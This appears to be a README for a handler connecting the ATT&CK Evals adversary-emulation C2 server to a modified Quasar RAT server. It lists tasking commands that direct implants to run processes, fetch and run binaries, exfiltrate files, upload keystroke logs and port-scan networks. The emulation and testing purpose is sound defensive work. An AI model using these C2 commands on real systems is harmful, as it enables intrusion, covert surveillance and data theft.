# Quasar C2 Server Compatibility Handler

This Quasar handler links the ATT&CK Evals C2 server with the standalone [Quasar C2 server by MaxXor](https://github.com/quasar/Quasar).
Note that the Quasar C2 server has been modified to support compatibility with the Evals C2 server - for more information, please see the modified
Quasar C2 server documentation in your Evals repository.

The compatibility between the Evals C2 server and the Quasar C2 server leverages REST API functionality provided by both the Evals C2 server and the modified Quasar
C2 server.

## Features

- Tracks Quasar implant sessions that are actively connected to the Quasar server
  - Every 15 seconds, gets a list of active Quasar implant connections. New implant connections are logged as new Quasar sessions via the Evals REST API server.
  - Implant sessions that get disconnected are logged to the Evals C2 server log file.
- Can task Quasar implants to do the following:
  - Execute processes on the local target machine
  - Perform a port scan for specific ports against a given network range
  - Download files from the Quasar server (the files must exist on the Quasar server itself)
  - Upload files to the Quasar server, which the Quasar evals C2 handler will pick up and save locally on the Evals C2 server.
  - Upload logged keystrokes to the Quasar server

## Tasking

You can task Quasar implants by sending requests to the internal REST server using the `evalsC2client.py` script. The Quasar handler will allow operators to task the following command types using a JSON dict payload format.

The JSON dict can contain the following fields:

- `seq` - `int` that represents the task number for the implant. This is for operator usability purposes so operators don't lose track of which commands they ran so far.
- `type` - `int` that represents the task type (e.g. process execution, file download, file upload)
  - `1` - execute a process
  - `2` - download file from Quasar server
  - `3` - upload file to Quasar Server
  - `4` - upload keystroke logs to Quasar Server for the specified client.
  - `5` - perform a port scan against a network range for specific ports
- `timeout` - `int` that represents the timeout in seconds for the Quasar handler to wait for tasks to complete. Default is 120 seconds. The timeout will be rounded up to the nearest multiple of 10. Specifying `0` will use the default value.
- Specific fields for process execution (task type `1`):
  - `proc_path` - string representing the local binary on the target machine to execute
  - `proc_args` - string representing the arguments to pass
  - `download_url` - string representing where to download a binary from to execute
  - `download_dst` - string indicating where to save the binary downloaded from `download_url`
  - `use_shell` - boolean indicating whether or not to execute the process using the OS shell. See [Microsoft documentation](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.7.2) for more information
  - `get_output` - boolean indicating whether or not to wait for the process to finish and retrieve stdout and stderr
  - `no_window` - boolean indicating whether or not to start the process in a new window. Some processes, like notepad, will create a new window regardless.
- Specific fields for general file transfers (task types `2` and `3`):
  - `transfer_src` - `string` that represents the source file for file transfers. Required when tasking file downloads or uploads.
  - `transfer_dst` - `string` that represents the destination file for file transfers.
- Specific fields for port scan tasks (task type `5`):
  - `range` - IPv4 CIDR `string` that specifies the target network to scan (e.g. `10.0.2.0/28`)
  - `ports` - `int` array that specifies which port(s) to scan. Must provide at least one port

Below are examples of each type code:

- `'{"seq": 1, "type": 1, "proc_path": "whoami.exe", "proc_args": "/all"}'` - the task type code `1` will have the implant execute `whoami.exe /all`, and the Quasar handler will retrieve the process stdout, stderr, PID, and exit code.
- `'{"seq": 4, "type": 1, "proc_path": "notepad.exe", "get_output": false}'` - open notepad and only retrieve the PID rather than waiting for process termination
- `{"type": 2, "transfer_src": "...", "transfer_dst": "..."}` - the task type code `2` will have the implant download the file specified by `transfer_src` from the Quasar server and save it to the path specified by `transfer_dst`.
- `{"type": 3, "transfer_src": "...", "transfer_dst": "..."}` - the task type code `3` will have the implant upload the file specified by `transfer_src` to the Quasar server, which will save it locally as the filename specified by `transfer_dst`. The Quasar c2 handler will grab the uploaded file and save it locally on the evals c2 server machine under the `./files/` subdirectory using the same filename specified by `transfer_dst`.
- `{"type": 4}` - instruct implant to upload its keystroke log files.
- `'{"type": 5, "range": "10.0.2.0/28", "ports":[8888, 3389], "timeout": 300}'` - instruct implant to perform a port scan for ports 8888 and 3389 against the `10.0.2.0/28` network range. The C2 handler will wait 300 seconds (5 minutes) before timing out

Examples of valid tasking:

```
./evalsC2client.py --set-task <guid> '{"seq": 1, "type": 1, "proc_path": "whoami.exe", "proc_args": "/all"}'
./evalsC2client.py --set-task <guid> '{"seq": 4, "type": 1, "proc_path": "notepad.exe", "get_output": false}'
./evalsC2client.py --set-task <guid> '{"type": 2, "transfer_src": "C:\\file\\on\\quasar\\server", "transfer_dst": "C:\\dest\\on\\target\\machine"}'
./evalsC2client.py --set-task <guid> '{"type": 3, "transfer_src": "C:\\file\\to\\exfil", "transfer_dst": "exfil.zip"}'
./evalsC2client.py --set-task <guid> '{"type": 4}'
./evalsC2client.py --set-task <guid> '{"type": 5, "range": "10.0.2.0/28", "ports":[8888, 3389], "timeout": 300}'
```

## Authentication

Under the hood, the Quasar handler will send the expected API key header when making REST API requests. If updating the API key in the Quasar C2 server source code, be sure to update it in the Quasar handler source code and recompile the evals c2 server binary.

## Decrypting Client Logs

Since each Quasar client log entry line is AES-encrypted and then base64-encoded, use the `decryptquasarlogs.py` utility to decrypt client logs:

```
python3 decryptquasarlogs.py -i /path/to/encrypted/logs -o out.txt
```

You will need to install pycryptodome first: `pip install pycryptodome`

## Usage

### Configuration

To enable and configure the Quasar handler within the control server, edit the corresponding handler config file within the `config/`
directory in the main C2 server repo. Create or adjust an existing Quasar handler entry as needed.

Example:

```
quasar:
  host: 10.0.2.7
  port: 80
  enabled: true
```

Note that `host` and `port` will not point to the address and listening port of the Evals C2 server, but rather to the address and listening port
of the Windows server running the Quasar C2 server.

Run the `controlServer` binary as `sudo` and look for success messages in starting up the Quasar handler:

```
sudo ./controlServer -c config/yourconfigfile.yml
```

## Troubleshooting

The Quasar handler uses the same logging mechanism as other Evals C2 handlers, so refer to the C2 server logs for any indication of errors.
However, since Quasar uses a separate server that the Evals C2 handler interacts with to a limited degree, there may be issues between the Quasar server and client
that the Quasar C2 handler doesn't have visilibity on. In those instances, refer to the Quasar documentation to inspect logs and troubleshoot some issues.

Below are some potential issues and how to address them:

- Suddenly unable to task implant, or implant doesn't seem to be picking up new tasks, even though it is active and executed tasks before
  - Restart the Quasar server to refresh the connection and then try tasking again
